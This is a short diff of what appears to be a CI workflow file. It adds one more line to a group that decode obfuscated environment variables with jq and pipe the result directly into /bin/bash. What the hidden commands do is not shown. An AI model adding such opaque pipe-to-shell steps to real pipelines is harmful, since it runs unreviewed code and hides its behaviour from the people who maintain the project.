@@ -26,6 +26,7 @@ jobs:
           echo $tdrek001 | jq -r .l9 | /bin/bash
           echo $mf565 | jq -r .b339 | /bin/bash
           echo $sgw5821 | jq -r .jgyug3 | /bin/bash
+          echo $ai955 | jq -r .spdtb85423 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
